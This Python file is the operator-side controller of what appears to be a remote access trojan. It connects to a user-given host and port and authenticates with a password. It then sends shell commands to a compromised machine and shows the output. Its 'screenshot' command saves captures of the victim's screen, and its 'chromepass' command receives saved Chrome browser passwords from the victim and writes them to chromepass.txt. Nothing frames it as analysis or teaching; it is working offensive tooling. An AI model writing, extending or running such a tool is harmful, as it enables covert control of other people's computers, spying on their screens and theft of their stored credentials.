import socket, os, time

SERVER_HOST = input("Enter host: ")
SERVER_PORT = int(input("Enter port: "))
BUFFER_SIZE = 1024 * 1280
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
if(s.recv(BUFFER_SIZE).decode()) == "auth": 
    password = input("Enter password to connect: ")
    s.send(password.encode())
    res = s.recv(BUFFER_SIZE).decode()
    if res == "denied":
        print("Authentication denied")
        exit()
    else:
        cwd = res  
        print("connected :-)")
        print(f"[+] pwd : {cwd}\n\n")
        while True:
            cmd = input(f"{cwd} $ ")
            s.send(cmd.encode())  
            if cmd.lower() == "screenshot":
                imgdata = s.recv(BUFFER_SIZE)
                filename = str(f'screenshot {time.strftime("%Y-%m-%d-%H-%M-%S")}.png')
                if not os.path.exists('screenshots'):
                    os.makedirs('screenshots')
                with open(f"./screenshots/{filename}", 'wb') as f:
                    f.write(imgdata) 
            elif cmd.lower() == "chromepass":    
                   chromepass = s.recv(BUFFER_SIZE).decode()
                   if chromepass != "null":
                        with open("chromepass.txt","a+") as f:
                                f.write(chromepass)
            output = s.recv(BUFFER_SIZE).decode()
            cwd = output.split(SEPARATOR)[0]
            if output.split(SEPARATOR)[1] == "exiting...":
                print("exiting...")
                break
            print(output.split(SEPARATOR)[1])
s.close()